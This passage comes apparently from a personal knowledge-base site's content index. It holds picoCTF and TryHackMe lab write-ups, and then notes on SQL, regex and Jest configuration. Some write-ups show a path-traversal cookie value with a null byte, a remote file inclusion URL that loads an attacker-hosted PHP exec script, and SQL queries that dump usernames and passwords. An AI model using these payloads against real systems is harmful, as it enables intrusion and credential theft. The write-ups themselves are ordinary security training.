😅\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/HashingJobApp":{"title":"HashingJobApp","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/243)\n\n## Steps\n\nThis one is about using the `md5` command to get a hash for provided string. I needed to do that 3 times.\n\nTo find an md5 hash of a string:\n\n```sh\n$ md5 -s \u003cstring\u003e\n```\n\nSimple as that.\n\n## Flag\n\n`picoCTF{4ppl1c4710n_r3c31v3d_674c1de2}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/Information":{"title":"Information","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/186)\n\n## Steps\n\nFirst, I've checked the filetype with the `file cat.jpeg` command to check if I'm dealing with a JPG file for sure, as I remember in the [[Matryoshka Dolls Writeup|Matryoshka doll]] exercise, the attached `dolls.jpg` was, in fact, a PNG.\n\n```\ncat.jpeg: JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2560x1598, components 3\n```\n\nThen I tried to check for embedded files inside with `binwalk -e cat.jpeg`, but without results. The `strings` command didn't provide anything valuable either.\n\nI forgot to check the EXIF data, so I went with `exiftool cat.jpeg` which responded with:\n\n```\nExifTool Version Number         : 12.30\nFile Name                       : cat.jpeg\nDirectory                       : .\nFile Size                       : 858 KiB\nFile Modification Date/Time     : 2022:04:21 15:19:08+02:00\nFile Access Date/Time           : 2022:04:21 15:28:52+02:00\nFile Inode Change Date/Time     : 2022:04:21 15:19:09+02:00\nFile Permissions                : -rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.02\nResolution Unit                 : None\nX Resolution                    : 1\nY Resolution                    : 1\nCurrent IPTC Digest             : 7a78f3d9cfb1ce42ab5a3aa30573d617\nCopyright Notice                : PicoCTF\nApplication Record Version      : 4\nXMP Toolkit                     : Image::ExifTool 10.80\nLicense                         : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9\nRights                          : PicoCTF\nImage Width                     : 2560\nImage Height                    : 1598\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 2560x1598\nMegapixels                      : 4.1\n```\n\nThe `License` field looked a bit odd, so I tried to decode it with a [base64 decoder](https://www.base64decode.org), and voila!\n\n## Flag\n\n`picoCTF{the_m3tadata_1s_modified}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/flag_shop":{"title":"flag_shop","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/49)\n\n## Steps\n\nThe exercise uses a simple server application that allows _buying the flag_, but initially, we don't have enough _funds_ to do so. The problem is how to get more funds by exploiting the server.\n\nFortunately, the author left the [source code](https://jupiter.challenges.picoctf.org/static/253c4651d852ac6342752ff222cf2a83/store.c) for reference. I am not that proficient in C, I've been using it a few years ago at the university, but I tried to hack this one nonetheless.\n\nThe only place where I am able to anything is when I get into `Buy flags -\u003e Definitely not the flag Flag`. _Buying_ this one won't get me the flag needed to pass the exercise, it'll just adjust the _funds_ (or: `account_balance`) accordingly.\n\n### Source code analysis\n\nThere are some suspicious looking lines of code in the source:\n\n```c\nint total_cost = 0;\ntotal_cost = 900 * number_flags;\n```\n\nBoth `total_cost` and `number_flags` are Integers, which means their the maximum value is `2147483647` (adding `1` will result in a signed int of `-2147483648`).\n\nThe `number_flags` is the only variable I can change.\n\nAlso:\n\n```c\naccount_balance = account_balance - total_cost;\n```\n\nThe `account_balance` is an Integer as well. It's decreased by the `total_cost`. That'd mean if I'd be able to make `total_cost` negative, the `account_balance` **would increase** (base maths, _negative_ + _negative_ =\u003e _positive_).\n\n### Making `total_cost` negative\n\nSo how can we make `total_cost` negative?\n\nLet's get back to the integer overflowing idea. I've opened an online C compiler and tried to mess with the values:\n\n```c\n#include \u003cstdio.h\u003e\n\nint main()\n{\n    int x = 2147483647 + 1; // overflowed to -2147483648\n    int y = 900 * x;\n    printf(\"number_flags: %d\\ntotal_cost: %d\", x, y);\n\n    return 0;\n}\n\n// Output:\n// number_flags: -2147483648\n// total_cost: 0\n```\n\nThat's no good. `900 * -2147483648` resulted in this:\n\n```sh\nwarning: overflow in conversion from ‘long int’ to ‘int’ changes value from ‘-1932735283200’ to ‘0’ [-Woverflow]\n```\n\nLet's try another:\n\n```c\nint x = 2147483647 + 10; // overflowed to -2147483639\nint y = 900 * x;\n\n// Output:\n// number_flags: -2147483639\n// total_cost: 8100\n```\n\nYay, we've increased the `total_cost`! But it's not enough to finish the task, as we need to make it negative.\n\n\u003e The thing is that we'd need to find such a value for incrementing the maximum integer value of `2147483647` to make the `900 * result` overflowing and becoming negative as well.\n\nI've been appending zeros to the `x` increment to the point when the `total_cost` would become negative. I've settled with that:\n\n```c\n#include \u003cstdio.h\u003e\n\nint main ()\n{\n  int x = 2147483647 + 100000000;\n  int y = 900 * -2047483649;\n  printf (\"number_flags: %d \\ntotal_cost: %d\", x, y);\n\n  return 0;\n}\n\n// Output:\n// number_flags: -2047483649\n// total_cost: -194314116\n```\n\n### Grabbing the flag\n\nUltimately I've opened the server once again, tried to _buy_ `100000000` flag knockoffs and my `account_balance` increased to `194314316`, which was enough to buy the final flag. Problem solved 💪\n\n## Disclaimer\n\nAs I said, at the time of writing this I am not that proficient in C, and the numeric systems are still a bit of the open waters to me. Probably I could find the easier way of increasing the `account_balance`. But thanks to that meddling I was able to find the flag and that's most important to me 😉\n\n## Flag\n\n`picoCTF{m0n3y_bag5_65d67a74}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/mus1c":{"title":"mus1c","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/15)\n\n## Steps\n\nAfter downloading and opening the `lyrics.txt` I saw somewhat cryptic lyrics of the _song_:\n\n```Rockstar\nPico's a CTFFFFFFF\nmy mind is waitin\nIt's waitin\n\nPut my mind of Pico into This\nmy flag is not found\nput This into my flag\nput my flag into Pico\n\n\nshout Pico\nshout Pico\nshout Pico\n\nMy song's something\nput Pico into This\n\nKnock This down, down, down\nput This into CTF\n\nshout CTF\nmy lyric is nothing\nPut This without my song into my lyric\nKnock my lyric down, down, down\n\nshout my lyric\n\nPut my lyric into This\nPut my song with This into my lyric\nKnock my lyric down\n\nshout my lyric\n\nBuild my lyric up, up ,up\n\nshout my lyric\nshout Pico\nshout It\n\nPico CTF is fun\nsecurity is important\nFun is fun\nPut security with fun into Pico CTF\nBuild Fun up\nshout fun times Pico CTF\nput fun times Pico CTF into my song\n\nbuild it up\n\nshout it\nshout it\n\nbuild it up, up\nshout it\nshout Pico\n```\n\nAfter a long while, I decided to check the hint, which suggested _mastering rockstar_. This little clue helped me to understand that the _song_ may be in fact the esoteric language.\n\nI compiled the _song code_ in [Rockstar -\u003e Try It](https://codewithrockstar.com/online) and got this output:\n\n```ASCII\n114\n114\n114\n111\n99\n107\n110\n114\n110\n48\n49\n49\n51\n114\nProgram completed in 38 ms\n```\n\nI changed newlines into spaces and put the output into the ASCII to text converter. The flag was mine.\n\n## Flag\n\n`picoCTF{rrrocknrn0113r}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/plumbing":{"title":"plumbing","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/48)\n\n## Steps\n\nThis one is really easy. I just needed to dump the output of `nc \u003cserver address and port\u003e` to a text file and try to find `picoCTF` string in it 🤷‍♂️\n\nTo dump the output and open it in VS Code:\n`nc jupiter.challenges.picoctf.org 4427 \u003e f.txt \u0026\u0026 code f.txt`\n\n## Flag\n\n`picoCTF{digital_plumb3r_5ea1fbd7}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/pw-crack-1":{"title":"PW Crack 1","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/245)\n\n## Steps\n\nI downloaded the `level1.py` (the script) and `level1.flag.py.enc` (the encrypted flag) files and opened the former with `python`.\n\nThe script asked for the password. From the source code, I knew the password was `8713`. However, the script was pretty stubborn about accepting the password:\n\n```sh\n$ python level1.py\nPlease enter correct password for flag: 8713\n8713\nThat password is incorrect\n```\n\n### Source code analysis\n\n```python\ndef level_1_pw_check():\n\tuser_pw = input(\"Please enter correct password for flag: \")\n\tprint(user_pw)\n\tif( user_pw == \"8713\"):\n\t\tprint(\"Welcome back... your flag, user:\")\n\t\tdecryption = str_xor(flag_enc.decode(), user_pw)\n\t\tprint(decryption)\n\t\treturn\n\tprint(\"That password is incorrect\")\n```\n\nIt seemed strange that `user_pw` should be equal to `\"8713\"`. I am not a daily Python user, but it seemed that it wanted me to pass a string value, not a number. I tried that:\n\n```sh\n$ python level1.py\nPlease enter correct password for flag: \"8713\"\n8713\nWelcome back... your flag, user:\n\u003credacted\u003e\n```\n\n...and the flag was mine. Easy peasy.\n\n## Flag\n\n`picoCTF{545h_r1ng1ng_1b2fd683}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/pw-crack-2":{"title":"PW Crack 2","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/246)\n\n## Steps\n\nI downloaded the `level2.py` (the script) and `level2.flag.py.enc` (the encrypted flag) files and opened the former with `python`.\n\nSimilar to [[cybersecurity/write-ups/picoCTF/pw-crack-1]], the script asked for the password. The difference lies in how the password was hardcoded in the source code.\n\n### Source code analysis\n\n```python\ndef level_2_pw_check():\n\tuser_pw = input(\"Please enter correct password for flag: \")\n\tif( user_pw == chr(0x64) + chr(0x65) + chr(0x37) + chr(0x36) ):\n\t\tprint(\"Welcome back... your flag, user:\")\n\t\tdecryption = str_xor(flag_enc.decode(), user_pw)\n\t\tprint(decryption)\n\t\treturn\n\tprint(\"That password is incorrect\")\n```\n\nFrom the source code, I knew the password was a concatenated set of strings:\n`chr(0x64) + chr(0x65) + chr(0x37) + chr(0x36)`.\n\nI just printed it in Python's REPL:\n\n```python\nprint (chr(0x64) + chr(0x65) + chr(0x37) + chr(0x36));\n\n# output:\n# de76\n```\n\nAgain, it needed to be passed as a string:\n\n```sh\n$ python level2.py\nPlease enter correct password for flag: \"de76\"\nWelcome back... your flag, user:\n\u003credacted\u003e\n```\n\n## Flag\n\n`picoCTF{tr45h_51ng1ng_489dea9a}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/pw-crack-3":{"title":"PW Crack 3","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/247)\n\nThis one is similar, but a bit harder than [[cybersecurity/write-ups/picoCTF/pw-crack-1]] and [[cybersecurity/write-ups/picoCTF/pw-crack-2]].\n\n## Steps\n\nFirst I downloaded the files:\n\n- `level3.py` - the script\n- `level3.flag.py.enc` - the encrypted flag\n- `level3.hash.bin` - the hash of the encrypted password\n\nAs suggested, I've also installed `bvi` (or \"binary vi\") from _brew_ (ultimately I didn't need it, but it's good to know such a program exists).\n\n### Source code analysis\n\nThe source code for this one differed a bit from the previous exercises. Namely - the password that the script asked for was read from the binary file.\n\nTo compare what's read from the file with what I put into the script, this function hashed the input string:\n\n```python\ndef hash_pw(pw_str):\n\tpw_bytes = bytearray()\n\tpw_bytes.extend(pw_str.encode())\n\tm = hashlib.md5()\n\tm.update(pw_bytes)\n\treturn m.digest()\n```\n\nAlso, there was a list of possible passwords and one of them _should_ work.\n\nI could just go one by one and put them in, but it wouldn't be performant, so I decided to open `level3.hash.bin` in VS Code first and check what's the content. This is what it looked like:\n\n```\n�`E��BC�;���Ϣi�\n```\n\nI wrote a simple function that'd iterate over the array of possible passwords and print the hashes for them:\n\n```python\npos_pw_list = [\"8799\", \"d3ab\", \"1ea2\", \"acaf\", \"2295\", \"a9de\", \"6f3d\"]\n\nfor p in pos_pw_list:\n\tprint(hash_pw(p))\n```\n\nThe third hash looked exactly the same as the one in `level3.hash.bin`:\n\n```\n�\u0005\u001b;�qlģ�/9�\u0019�s\n+\u0026�A��)HBf\u0006\u000f�\u0002C\n�`E��BC�;���Ϣi� // \u003c-- this one\n=�9d�\u0004=�����1�\u001f-\n\u0016\u0002m`��TA\u000b45�\u0003��\u0026\n��秦����=��F��L\n��\u001dV�Jx��\u0005CR���j\n```\n\n...so I just tried the third password from the array and it worked 😁\n\n\u003e Note: this time I've had to put it in the prompt without quotes\n\n## Flag\n\n`picoCTF{m45h_fl1ng1ng_6f98a49f}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/pw-crack-4":{"title":"PW Crack 4","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/248)\n\nThis one is basically the same as [[cybersecurity/write-ups/picoCTF/pw-crack-3]], the only difference is the possible passwords count.\n\n## Steps\n\n_PW Crack 3_ was proposing a valid password among 6 non-valid ones. This exercise gives 100 options to validate instead.\n\nI could go over each of them, but it wouldn't be feasible. Instead, I modified the function I created before to print out the hashes to print only the password that's hash is the same as `correct_pw_hash`.\n\n```python\nfor p in pos_pw_list:\n\tif (hash_pw(p) == correct_pw_hash):\n\t\tprint(p)\n```\n\nI seriously wonder why I didn't take the same route when doing _PW Crack 3_. I'm starting to like Python...\n\n## Flag\n\n`picoCTF{fl45h_5pr1ng1ng_ae0fb77c}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/pw-crack-5":{"title":"PW Crack 5","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/249)\n\nThe final one of the _PW Crack_ series.\n\n## Steps\n\nI began by downloading all the files and opened `dictionary.txt` first.\n\nIt had \u003e65k passwords (from `0x0000` to `0xffff`) and only one was correct. I knew could reuse the loop from [[cybersecurity/write-ups/picoCTF/pw-crack-4]].\n\nHowever, the hints mentioned the `.strip()` fn, which meant that some passwords in the file would have whitespaces that I'd need to get rid of.\n\nSo I slightly modified the loop to strip the whitespaces first, then compare the passwords hashes with the correct one:\n\n```python\nwith open('dictionary.txt', 'r') as passwords:\n\tfor password in passwords:\n\t\tstripped_password = password.strip()\n\t\tif (hash_pw(stripped_password) == correct_pw_hash):\n\t\t\tprint(stripped_password)\n```\n\nAnd that was it.\n\n## Flag\n\n`picoCTF{h45h_sl1ng1ng_fffcda23}`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/thm/":{"title":"THM Challenges","content":"","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/thm/lfi-ctf-1":{"title":"LFI CTF","content":"\n[Link to the exercise](https://tryhackme.com/room/fileinc)\n\n## Goal\n\nCapture Flag1 at `/etc/flag1` using [[cybersecurity/knowledge/pentesting/LFI]].\n\n## Steps\n\nAfter spinning up the VM, I've opened the `/challenges/chall1.php` to see that `POST` param is used to include file contents into the web application.\n\nI've opened Postman app (provided by THMs AttackBox) and called the PHP script with `file` request parameter:\n\n![[assets/Screenshot 2023-01-04 at 16.14.43.png]]\n\n## Flag\n\n`F1x3d-iNpu7-f0rrn`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/thm/lfi-ctf-2":{"title":"LFI CTF 2","content":"\n[Link to the exercise](https://tryhackme.com/room/fileinc)\n\n## Goal\n\nSimilarly to [[cybersecurity/write-ups/thm/lfi-ctf-1|LFI CTF #1]], the goal is to capture the flag at `/etc/flag2` using [[cybersecurity/knowledge/pentesting/LFI]].\n\n## Steps\n\n### Recon\n\nThe PHP application forced me to refresh itself at the very first contact. After refreshing the page, the cookie named `THM` was set with `Guest` as the value.\n\nBy chaning `Guest` to `Administrator`, I've been able to see the file inclusion error:\n\n```\nWarning: include(includes/Administrator.php) [function. include]: failed to open stream: No such file or directory in /var/www/html/chall2.php on line 37\nWarning: include() [function. include]: Failed opening 'includes/Administrator. php' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in /var/www\n/html/chall2.php on line 37\n```\n\nFrom the error it's kinda obvious that the username set in `THM` cookie is also an included file name.\n\nTo validate the idea, I've changed the cookie value to `Dupa` and saw the same error, but with `Dupa.php` file missing (btw, nice privileges management).\n\n### Exploitation\n\nI've changed the cookie value once more to `../../../../../etc/flag2%00` (using the [[cybersecurity/knowledge/pentesting/null-byte|null byte]] to omit `php` extension in `include` fn). After refreshing the page flag was mine.\n\n![[assets/Screenshot 2023-01-04 at 17.01.28.png]]\n\n## Flag\n\n`c00k13_i5_yuMmy1`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/thm/lfi-ctf-3":{"title":"LFI CTF 3","content":"\n[Link to the exercise](https://tryhackme.com/room/fileinc)\n\n## Goal\n\nSimilarly to [[cybersecurity/write-ups/thm/lfi-ctf-1]] and [[cybersecurity/write-ups/thm/lfi-ctf-2]], the goal is to capture the flag at `/etc/flag3` using [[cybersecurity/knowledge/pentesting/LFI]].\n\n## Steps\n\n### Recon\n\nSimilarly to [[cybersecurity/write-ups/thm/lfi-ctf-1]], we're dealing with the PHP application that includes the file. In this case the file is provided as a `GET` query param.\n\nI've tried several filenames to see if there's something worthy looking, only to get to know that everything that is not the letter is escaped (numbers, special characters and dots are filtered out of the string). so the `GET` parameter was a no go.\n\nHowever, the hint suggested that the website uses PHPs' `$_REQUEST` to accept HTTP requests. I am not a PHP developer, but from the [docs](https://www.php.net/manual/en/reserved.variables.request.php) I got to know that `$_REQUEST` had contents of both `$_GET` and `$_POST` (and `$_COOKIE`, but that's doesn't matter here).\n\n### Exploitation\n\nI've ran Burp Suite to intercept the `GET` request sent from the website form and edited it to be `POST` one with `welcome2` as a string. Fortunately, with `POST`, the PHP code tried to include the file without filtering out the number (`2`).\n\nSo I've tried to include `/etc/flag3%00` (flag file with [[cybersecurity/knowledge/pentesting/null-byte]]) with success:\n\n![[assets/Screenshot 2023-01-04 at 20.41.45 1.png]]\n\n## Flag\n\n`PP0st_1s_w0rk1in9`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/thm/lfi-ctf-rce":{"title":"Remote Code Execution CTF","content":"\n[Link to the exercise](https://tryhackme.com/room/fileinc)\n\n## Goal\n\nContrary to [[cybersecurity/write-ups/thm/lfi-ctf-1]] and later ones, this CTF is about finding a flag hidden as a `hostname` with [[cybersecurity/knowledge/pentesting/RFI|Remote File Inclusion]].\n\n## Steps\n\n### Recce\n\nI've opened the web app and tried to `include` a bunch of files that might exist already in the filesystem ([[cybersecurity/knowledge/pentesting/LFI]]) - to no avail. Since the challenge is about [[cybersecurity/knowledge/pentesting/RFI]], I've written a simple PHP script that'd echo a string to see if RFI is possible _out-of-the-box_:\n\n```php\n\u003c?php\necho \"hostname\";\n?\u003e\n```\n\nSince I didn't know where to host that file, I've started `SimpleHTTPServer` with\n\n```sh\npython -m http.server ~/Desktop\n```\n\n(as I saved my script on the desktop).\n\nThen I tried to `include` it as a query param:\n\n```\nhttp://10.10.55.248/playground.php?file=http://10.10.224.87:8000/hostname.php\n```\n\n(where `.55.248` is the attacked machine and `.224.87` is my AttackBox instance).\n\n![[assets/Screenshot 2023-01-04 at 21.18.30.png]]\n\nGood. The string was included.\n\n### Exploitation\n\nSince I've found the vulnerability, I've modified my script a bit to use PHPs' [exec fn](https://www.php.net/manual/en/function.exec.php):\n\n```php\n\u003c?php\necho exec(\"hostname\");\n?\u003e\n```\n\nand refreshed the page.\n\n## Flag\n\n`lfi-vm-thm-f8c5b1a78692`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/":{"title":"Software Development","content":"","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/databases/":{"title":"Databases","content":"","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/databases/glossary/DBMS":{"title":"DBMS","content":"\n_Database Management System_ is a software that controls a database.\n\nDBMS's fall into two camps: *Relational* or *Non-Relational*.\n\nA relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a **primary key** which will then be used in other tables to reference it and cause a _relationship_ between the tables.\n\nNon-relational databases (_NoSQL_) on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database. Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.\n\nWithin a DBMS, you can have multiple databases, each containing its own set of related data.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/databases/mysql-cheatsheet":{"title":"MySQL Cheatsheet","content":"\n_SQL_ (Structured Query Language) is a feature-rich language used for querying databases. These queries are better referred to as _statements_.\n\nAll of these examples are based on MySQL syntax.\n\n## SELECT\n\nUsed to retrieve data from the database.\n\n```sql\n-- select all columns from the `users` table\nSELECT * FROM users;\n\n-- select `username` and `password` column from the `users` table\nSELECT username, password FROM users;\n\n-- select only 1 row from the `users` table\nselect * from users LIMIT 1;\n\n-- select 1 row, but skip first two rows (effectively selecting 3rd row)\nselect * from users LIMIT 2,1;\n\n-- select all columns from the `users` where the `username` col value is/is not `admin`\nselect * from users where username = 'admin';\nselect * from users where username != 'admin';\n\n-- select the rows where the `username` is either `admin` or `jon`\nselect * from users where username='admin' or username='jon';\n\n-- select the rows where the username is `admin` and `password` is `p4ssword`\nselect * from users where username='admin' and password='p4ssword';\n\n-- [LIKE clause]\n-- select any rows with username beginning with the letter a.\nselect * from users where username like 'a%';\n\n-- select any rows with username ending with the letter n.\nselect * from users where username like '%n';\n\n-- select any rows with a username containing the characters `mi` within them.\nselect * from users where username like '%mi%'\n\n```\n\n`\n\n## UNION\n\nThe `UNION` statement combines the results of two or more `SELECT` statements to retrieve data from either single or multiple tables.\n\nThe `UNION` statement must retrieve the same number of columns in each `SELECT` statement, the columns have to be of a similar data type and the column order has to be the same.\n\n```sql\n-- select results from two tables and put them into one result set\n\nSELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;\n\n```\n\n## INSERT\n\nThe `INSERT` statement tells the database we wish to add a new row of data into the table.\n\n```sql\n-- add username=bob, password=123 row into `users` table\ninsert into users (username,password) values ('bob','123');\n```\n\n## UPDATE\n\nThe `UPDATE` statement tells the DB we wish to update (alter) one or more rows of data within a table.\n\n```sql\n-- update `admin` username and password\nupdate users SET username='root',password='pass123' where username='admin';\n```\n\n## DELETE\n\nThe **DELETE** statement tells the database we wish to delete one or more rows of data.\n\n```sql\n-- delete `admin` user\ndelete from users where username='martin';\n```\n\nApart from missing the columns you wish to be returned, the format of this query is very similar to the `SELECT`. You can specify precisely which data to delete using the `WHERE` clause and the number of rows to be deleted using the `LIMIT` clause.\n\n## Methods\n\n### database()\n\nReturns the db name\n\n### group_concat(table_name)\n\nGets the specified column from multiple returned rows and puts it into one string separated by commas.\n\n## information_schema\n\nContains information about all the databases and tables the user has access to.\n\n```sql\nSELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'\n\nSELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'\n\nSELECT 1,2,group_concat(username,':',password SEPARATOR '\u003cbr\u003e') FROM staff_users\n```\n\n## sleep(x)\n\nSleeps (pauses) for `x` **seconds**, then returns 0.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/regexps":{"title":"Regular Expressions Cheatsheet","content":"\nRegular expression - a sequence of characters representing a pattern.\n\nThey are pretty hard to maintain:\n\n\u003e If you'll use regular expression to solve a problem, you'll have two problems.\n\nRegular expressions are case-sensitive by default.\n\nWe need to keep in mind the special characters, like `.`. (metacharacters).\n\nIt's generally better to re-use the regular expressions available over the Internet, as they are pretty tricky to write and maintain. The bugs in these are probably fixed by the community already.\n\n## Metacharacters\n\n| metachar      | meaning                                                          |\n| ------------- | ---------------------------------------------------------------- |\n| `.`           | any character                                                    |\n| `^`           | match only the pattern that occures at the beginning of the line |\n| `$`           | match only the pattern that occures at the end of the line       |\n| `\\w`          | word (a-z, A-Z, 0-9, `_`)                                        |\n| `\\W`          | **not** word (plus `\\n`)                                         |\n| `\\n`          | new line                                                         |\n| `\\t`          | tab                                                              |\n| `\\d`          | digit                                                            |\n| `\\d\\d`        | number of 2 digits                                               |\n| `\\d\\d-\\d\\d\\d` | Polish zip code (12-345)                                         |\n\n## Operators\n\n| operator     | meaning                            |\n| ------------ | ---------------------------------- |\n| `+`          | at least one occurence             |\n| `\\d+`        | at least one digit                 |\n| `*`          | 0 or more occurences               |\n| `{3}`        | exactly 3 occurences               |\n| `\\d{3}`      | exactly 3 digits                   |\n| `{1,3}`      | between 1 and 3 occurences         |\n| `[]`         | set of matched characters or range |\n| `[ -]`       | either space or `-` or both        |\n| `[A-Z]`      | letter between A-Z                 |\n| `(-\u003cpipe\u003e )` | space **OR** `-` (`\u003cpipe\u003e` =\u003e OR)  |\n| `\\`          | escape metacharacters              |\n| `\\.`         | dot (escaped `.`)                  |\n| `^`          | negation                           |\n\n## Flags\n\n| flag | meaning                                                            |\n| ---- | ------------------------------------------------------------------ |\n| `g`  | match **all** occurences                                           |\n| `m`  | make `^` and `$` work in **every** line (not only first/last ones) |\n| `i`  | make the expression case-insensitive                               |\n\n## Groups\n\n| operator | meaning                           |\n| -------- | --------------------------------- |\n| `()`     | encapsulate expression in a group |\n| `(?:)`   | not group?                        |\n\n### Groups indexing\n\nGroups are indexed from 1.\n`$2` - first group in matched pattern\n\n## Examples\n\n### Phone number\n\n```\n(\\d{3}(-1 )){2}\\d{3}\n- (\\d{3}(-1 )){2} - match (123- | 123\u003cspace\u003e) twice\n- then match last (123)\n\n123-456-789\n123 456 789\n```\n\n### Email\n\nThere's no perfect email regex, but [this one is pretty close](https://emailregex.com).\n\n### CSS `rgb`/`rgba` function\n\n```\n^rgba?\\([0-9, ]+\\);$\n```\n\n### CSS `rgb()` and `rgba()` values\n\n```regexp\n^rgba?\\((\\d{1,3}(?:,\\s?\\d{1,3}){2}(?:,\\s?[0-1]\\.?\\d?)?)?\\);?$\n```\n\nMatches:\n\n- rgb(**1, 2, 3**);\n- rgba(**1, 2, 3, 0.4**);\n\n## Apps\n\n- regex101.com\n- regexr.com\n- [Expressions](https://www.apptorium.com/expressions) (also available in [[Setapp]])\n\n## Ideas to explore\n\nRegular Expressions aren't usable only for programming. They can be used to:\n\n- [ ] Automating the e-mails management via Zapier/Make.com\n  - labeling the e-mails\n  - sending them to Todoist\n\n## Resources\n\n- [Regex for WebDeveloper course](https://eduweb.pl/programowanie-i-www/javascript/regex-dla-webdevelopera) 🇵🇱\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/":{"title":"Testing JavaScript","content":"\nCourse notes I've taken during [Testing JavaScript](https://testingjavascript.com/) course by [Kent C. Dodds](https://kentcdodds.com/).\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/configuring-jest/":{"title":"Configuring Jest","content":"","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/configuring-jest/code-coverage-in-jest":{"title":"Code Coverage in Jest","content":"\nUse `jest --coverage` to generate coverage report after testing. The report in HTML will be saved in `./coverage` directory. This directory **should** be included in `.gitignore`.\n\nThe coverage report will include the _test utilities_ as well, which makes no sense and affects the stats. We only want to know how well tested the application code is.\n\nWe can add `collectCoverageFrom` to `jest.config.js`.\n\n```js\nmodule.exports = {\n  collectCoverageFrom: [\"**/src/**/*.js\"],\n};\n```\n\n\u003e [!tip] Jest is excluding `__tests__` by default\n\nThe coverage report is generated by `babel-plugin-istanbul` under the hood. It's possible to omit some parts in the coverage report with `/* istanbul ignore next */` directive. However this is not recommended, as it's a kind of _lying to yourself_ about how much of the code have been covered.\n\nIt's possible to set the `coverageThreshold` that will enforce how much of coverage is necessary for the code to pass the tests:\n\n```js\nmodule.exports = {\n  coverageThreshold: {\n    global: {\n      statements: 100,\n      branches: 100,\n      functions: 100,\n      lines: 100,\n    },\n  },\n};\n```\n\nIt's nice to set a bit below what the coverage is as of now, to make sure there won't be much of new code without tests committed.\n\n\u003e [!danger] The coverage is not a perfect metric for confidence.\n\u003e\n\u003e Not all lines in the codebase are _equal_ (some are more important than others).\n\nIt's possible to use a glob when setting the `coverageThreshold`.\n\n```js\nmodule.exports = {\n  coverageThreshold: {\n    \"./src/shared/utils.js\": {\n      statements: 100,\n      branches: 100,\n      functions: 100,\n      lines: 100,\n    },\n  },\n};\n```\n\n**Note:** When we add the specific files to the configuration, the `global` coverage threshold **lowers**.\n\nThe coverage can be added to CI/CD setup using [codecov](https://codecov.io).\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/development/testing-javascript/configuring-jest/configuring-jest-for-testing-js-applications":{"title":"Configuring Jest for testing JS applications","content":"\n\u003e This note goes through useful Jests features, without actually going to how to write tests.\n\n## `process.env.NODE_ENV`\n\nFor testing `process.env.NODE_ENV === 'test'`. This can be used to enable `commonjs` modules in `babel` just for testing.\n\nJest picks up `.babelrc.js` automatically.\n\n## Configuring Jest's test environment for testing `node` or browser code\n\nJest uses JS DOM module to simulate browser in `node`. Technically the `window` property is simulated in `node` environment.\n\nWe can customize Jest to _enforce_ Browser/`node` environment with:\n\n```sh\njest -- --env=\"node\" // this will exclude JS DOM from the environment\n```\n\nIncluding JS DOM in the test runner without actually having a code that relies on the browser APIs may negatively affect the runners performance.\n\nThis can also be handled in `jest.config.js`:\n\n```js\nmodule.exports = {\n  testEnvironment: \"jest-environment-node\",\n  // testEnvironment: 'jest-environment-jsdom' // 